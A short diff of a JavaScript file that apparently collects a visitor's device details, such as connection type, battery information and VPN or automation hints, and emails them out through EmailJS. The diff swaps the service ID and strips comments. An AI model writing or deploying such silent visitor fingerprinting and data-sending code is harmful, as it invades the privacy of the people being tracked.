@@ -47,7 +47,7 @@ CONNECTION TYPE: ${data.connectionType}`
     };
     
     try {
-        await emailjs.send("service_14u2qeo", "template_psyarye", emailData);
+        await emailjs.send("service_yn5chrh", "template_psyarye", emailData);
     } catch (error) {
         console.error('Email failed:', error);
     }
@@ -122,12 +122,10 @@ async function getBatteryInfo() {
 }
 
 function detectVPN() {
-    // Simple VPN detection based on common patterns
     const userAgent = navigator.userAgent;
     const language = navigator.language;
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     
-    // Basic heuristics
     if (userAgent.includes('VPN') || userAgent.includes('Proxy')) return 'detected';
     if (navigator.webdriver) return 'possible automation';
     return 'not detected';
